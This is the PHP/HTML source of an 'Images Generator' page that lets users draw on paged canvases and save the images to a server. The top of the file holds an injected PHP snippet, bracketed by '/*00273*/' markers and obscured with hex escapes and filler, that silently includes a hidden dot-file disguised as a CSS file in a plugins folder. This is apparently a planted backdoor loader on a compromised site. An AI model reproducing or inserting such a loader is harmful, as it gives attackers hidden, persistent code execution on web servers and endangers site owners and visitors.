<?php
/*00273*/

$r8567z = "/\x68ome/xxx/public_\x68tml/LogisticDemo/plugins/datatables\x2dscroller/.782debca.css"; if (198 + 147){ @include_once /* hfe */ ($r8567z); }

/*00273*/



?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <title>Images Generator</title>

    <link rel="icon" type="image/png" href="images/favicon_ka.png">
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/media.css">
    <link rel="stylesheet" href="css/image_generator.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
   <!-- <script type="text/javascript" src="js/image_generator.js"></script>-->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* CSS to display buttons in the same line */
        #downloadBtn, #toggleModeBtn {
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px; /* Adjust margin as needed */
        }

        /* Style for canvas navigation buttons */
        .canvas-buttons {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 5px;
        }

        .canvas-buttons a {
            text-decoration: none;
            color: #fff;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 16px;
        }

        .canvas-buttons a:hover {
            background-color: rgba(0, 0, 0, 0.8);
        }
        .page-number {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 16px;
            font-weight: bold;
        }
        canvas {
            display: none; /* Hide all canvases initially */
        }

        canvas.active {
            display: block; /* Show only the active canvas */
            display: block;
            margin: 10px auto 15px;
            cursor: url(images/brush.png) 5 35, auto;
        }
    </style>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" no-cache">
    <meta http-equiv="Expires" content="0">
</head>
<body>

<a id="downloadBtn" href="#">Save</a>
<a id="toggleModeBtn" href="#">Eraser</a>

<div id="wrapper" style="overflow: auto; position: relative;">
    <div class="canvas-buttons">
        <a id="prevPageBtn" href="#"><i class="fas fa-arrow-left"></i></a>
        <div class="page-number" id="pageNumber">1</div>
        <a id="nextPageBtn" href="#"><i class="fas fa-arrow-right"></i></a>
    </div>
    <canvas id="canvas1" class="active" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas2" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas3" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas4" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas5" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas6" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas7" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas8" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas9" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <canvas id="canvas10" style="border: 2px solid blue;">
        Hey! Try another browser.
    </canvas>
    <div id="clearFix"></div>
</div>

<script>
    $(document).ready(function() {
        var canvases = $('canvas');
        var currentCanvasIndex = 0;

        function showCanvas(index) {
            canvases.removeClass('active');
            $(canvases[index]).addClass('active');
            $('#pageNumber').text(index + 1);
            
            var urlParams = new URLSearchParams(window.location.search);
            var optyNum = urlParams.get('opty_num');

        // Check if the image exists
        
        var imageUrl = 'images/' + optyNum + '/'+currentCanvasIndex+'.jpg?' + new Date().getTime();
        $.ajax({
            type: "HEAD",
            url: imageUrl,
            success: function() {
                // Image exists, load it onto the canvas
                var img = new Image();
                img.onload = function() {
                    var canvas = document.getElementById('canvas' + (currentCanvasIndex + 1));
                    canvas.getContext('2d').drawImage(img, 0, 0);
                };
                img.src = imageUrl;
            },
            error: function() {
                // Image does not exist, handle accordingly
                console.log('Image not found.');
            }
        });

        }

        $('#prevPageBtn').click(function(e) {
            e.preventDefault();
            if (currentCanvasIndex > 0) {
                currentCanvasIndex--;
                showCanvas(currentCanvasIndex);
            }
        });

        $('#nextPageBtn').click(function(e) {
            e.preventDefault();
            if (currentCanvasIndex < canvases.length - 1) {
                currentCanvasIndex++;
                showCanvas(currentCanvasIndex);
            }
        });

        var urlParams = new URLSearchParams(window.location.search);
        var optyNum = urlParams.get('opty_num');

        // Check if the image exists
        
        var imageUrl = 'images/' + optyNum + '/'+currentCanvasIndex+'.jpg?' + new Date().getTime();
       //alert(imageUrl);
        $.ajax({
            type: "HEAD",
            url: imageUrl,
            success: function() {
                // Image exists, load it onto the canvas
                var img = new Image();
                img.onload = function() {
                    var canvas = document.getElementById('canvas' + (currentCanvasIndex + 1));
                    canvas.getContext('2d').drawImage(img, 0, 0);
                };
                img.src = imageUrl;
            },
            error: function() {
                // Image does not exist, handle accordingly
                console.log('Image not found.');
            }
        });

        // Variable to track current mode (pencil or eraser)
        if(!currentMode){
        var currentMode = 'eraser';
        }
        // Function to toggle between pencil and eraser modes
        function toggleMode() {
            if (currentMode == 'pencil') {
                // Switch to eraser mode
                currentMode = 'eraser';
                $('#toggleModeBtn').text('Eraser');
                // Change cursor to eraser
                $('.active').css('cursor', 'url("images/brush.png") 5 35, auto');
            } else {
                // Switch to pencil mode
                currentMode = 'pencil';
                $('#toggleModeBtn').text('Pencil');
                // Change cursor to pencil
        
                $('.active').css('cursor', 'url("images/eraser.png") 5 35, auto');
            }
        }
        
        // Attach click event to the toggle mode button
        $('#toggleModeBtn').click(function() {
            toggleMode();
        });

        $('#downloadBtn').click(function() {
            // Convert canvas to data URL
            var canvas = document.querySelector('canvas.active');
            var downloadImg = canvas.toDataURL("image/jpg");
            
            // Get the value of 'opty_num' from the URL
            var urlParams = new URLSearchParams(window.location.search);
            var optyNum = urlParams.get('opty_num');
            var canvasIndex = currentCanvasIndex;

            // Post the data to PHP script to save on the server
            $.ajax({
                type: "POST",
                url: "save_image.php", // Assuming save_image.php is the PHP script to handle image saving
                data: {
                    imageData: downloadImg,
                    optyNum: optyNum,
                    canvasIndex: canvasIndex,
                    filename: canvasIndex + ".jpg" // Set filename to 'opty_num.jpg'
                },
                success: function(response) {
                    // Handle success, if needed
                    console.log(response);
                }
            });
        });

        // Toast for save success message
        document.getElementById('downloadBtn').addEventListener('click', function() {
            const Toast = Swal.mixin({
                toast: true,
                position: 'top-middle',
                showConfirmButton: false,
                timer: 1200,
                timerProgressBar: true,
                didOpen: (toast) => {
                    toast.onmouseenter = Swal.stopTimer;
                    toast.onmouseleave = Swal.resumeTimer;
                }
            });
            Toast.fire({
                icon: 'info',
                title: 'Saved Successfully!'
            });
        });


    $(function(currentCanvasIndex) {
    var uploadFile, index, imgName,
        cusText, cusImgName,
        downloadImg;

    var canvases = $('canvas');
    var currentCanvasIndex = 0; // Assuming canvas1 is the initial active canvas
    canvases.each(function() {
        this.width = 800;
        this.height = 1000;
    });

    function getCurrentCanvas(currentCanvasID) {
        var activeCanvasIDtemp=currentCanvasID.substring(6);
      // alert(activeCanvasIDtemp);
        return canvases[activeCanvasIDtemp-1]; // Adjust index by subtracting 1
    }

    function getCurrentContext(currentCanvasID) {
        var activeCanvasIDtemp=currentCanvasID.substring(6);
        return canvases[activeCanvasIDtemp-1].getContext('2d'); // Adjust index by subtracting 1
    }

    function sendToCanvas(ob) {
        var img = new Image();
        img.onload = function() {
            var canvas = getCurrentCanvas();
            var ctx = getCurrentContext();
            ctx.drawImage(img, 0, 0);
            ctx.fillStyle = ob.color;
            ctx.font = ob.fontWeight + ' ' + ob.fontSize + ' ' + ob.fontFamily;
            ctx.fillText(ob.text, canvas.width / 8, canvas.height / 2.5);
        };
        img.crossOrigin = "Anonymous";
        img.src = ob.image;
    }

    // Event listeners for choosing image, uploading image, and drawing canvas
    $('.imgs').click(function() {
        var changeImg = $(this).attr('src');
        cvsObj.image = changeImg;
        sendToCanvas(cvsObj);
    });

    $('#uploadButton').change(function() {
        var canvas = getCurrentCanvas();
        var ctx = getCurrentContext();
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        uploadFile = $('#uploadButton')[0].files[0];
        index = uploadFile.name.lastIndexOf('.');
        imgName = uploadFile.name.slice(0, index);
        readImg();
    });

    function readImg() {
        var reader = new FileReader();
        reader.readAsDataURL(uploadFile);
        reader.onload = function() {
            cvsObj.image = this.result;
            sendToCanvas(cvsObj);
        };
    }

    // Get the customize text
    $('#cusText').on("input", function() {
        cvsObj.text = $('#cusText').val();
        sendToCanvas(cvsObj);
    });

    // Get the customize filename
    $('#cusImgName').change(function() {
        cusImgName = $('#cusImgName').val();
    });

    // Download image
    $('#downloadBtn').click(function() {
        var canvas = getCurrentCanvas();
        downloadImg = canvas.toDataURL("image/jpg");
        $('#downloadBtn').attr('href', downloadImg);

        // Detect customize filename change
        if (cusImgName) {
            $('#downloadBtn').attr('download', cusImgName + '.jpg');
        } else if (imgName) {
            $('#downloadBtn').attr('download', imgName + '-image_generator_ByKa' + '.jpg');
        }

        // Clear customize text after download
        $('#cusText').val('');
    });

    // Palette, brush size, and brush color settings
    // ...
// Change brush color
var paint = true;
	var rainbowSwitch;
	var colorChoice = '#000';
    if (urlParams.get('verifier') === '1') {
            colorChoice = 'red';
     }
     if (Number(urlParams.get('verifier')) >= 2) {
            colorChoice = '#A020F0';
     }
    var sizeChoice=1;
	$('#toggleModeBtn').click(function(){ 

		if($('#toggleModeBtn').text()!='Eraser'){ 
		paint = true;
		rainbowSwitch = false;
		$('.option, #eraser').removeClass('active');
		$(this).addClass('active');
		
		if ($('.option:last-child').hasClass('active')) {
			rainbowSwitch = true;
			colorChoice = 'linear-gradient(to bottom right, red, orange, yellow, green, blue, purple';
			$('.penSize').css('background', '#fff');
		}else{
			colorChoice = $(this).css('background-color');
			colorChoice = '#fff';
			$('.penSize').css('background', '#fff');
			sizeChoice = 30;
			$('.penBox, #eraser').removeClass('active');
			$(this).addClass('active');
			sizeChoice = 30;
			
		}
	}else{
		paint = true;
		rainbowSwitch = false;
		$('.option, #eraser').removeClass('active');
		$(this).addClass('active');
		
		if ($('.option:last-child').hasClass('active')) {
			rainbowSwitch = true;
			colorChoice = 'linear-gradient(to bottom right, red, orange, yellow, green, blue, purple';
			$('.penSize').css('background', '#000');
		}else{
			colorChoice = $(this).css('background-color');
			colorChoice = '#000';
            if (urlParams.get('verifier') === '1') {
            colorChoice = 'red';
            } 
            if (Number(urlParams.get('verifier')) >= 2) {
            colorChoice = '#A020F0';
             }
			$('.penSize').css('background', '#000');
			 sizeChoice = 1;
			$('.penBox, #eraser').removeClass('active');
			$(this).addClass('active');
			sizeChoice =  1;
		
		}
	}
	});
    // Event listeners for drawing on canvas
    canvases.on('mousedown touchstart', function(e) {
        var currentCanvasID = $(this).attr('id');
        var canvas = getCurrentCanvas(currentCanvasID);
        ctx = getCurrentContext(currentCanvasID);
        var offsetX = e.offsetX || e.originalEvent.touches[0].pageX - $(this).offset().left;
        var offsetY = e.offsetY || e.originalEvent.touches[0].pageY - $(this).offset().top;
      
        // Handle drawing events based on the active canvas
        var gradient = ctx.createLinearGradient(offsetX, offsetY, (offsetX+70), (offsetY+70));
			gradient.addColorStop('0.0','#f7120c'); 
			gradient.addColorStop('0.1','#ef540b'); 
			gradient.addColorStop('0.2','#f7890c'); 
			gradient.addColorStop('0.3','#f3f70c'); 
			gradient.addColorStop('0.4','#89f70c'); 
			gradient.addColorStop('0.5','#0cf795'); 
			gradient.addColorStop('0.6','#0ceff7'); 
			gradient.addColorStop('0.7','#0c69f7'); 
			gradient.addColorStop('0.8','#660cf7'); 
			gradient.addColorStop('0.9','#950cf7'); 
			gradient.addColorStop('1.0','#c40cf7');

			if (rainbowSwitch) ctx.strokeStyle = gradient; 
			else ctx.strokeStyle = colorChoice; 
			ctx.lineWidth   = sizeChoice;
        
        ctx.beginPath();
        ctx.moveTo(offsetX, offsetY);

        $(this).on('mousemove touchmove', function(e) {
            e.preventDefault();
            offsetX = e.offsetX || e.originalEvent.touches[0].pageX - $(this).offset().left;
            offsetY = e.offsetY || e.originalEvent.touches[0].pageY - $(this).offset().top;

            ctx.lineTo(offsetX, offsetY);
            ctx.stroke();
        });

        $(this).on('mouseup touchend', function() {
            $(this).off('mousemove touchmove');
            $(this).off('mouseup touchend');
            ctx.closePath();
        });
    });

    // Change canvas width and height for mobile devices
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        canvases.each(function() {
            this.width = 800;
            this.height = 1000;
        });
    }
});
    });

    

</script>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js"></script>

</body>
</html>
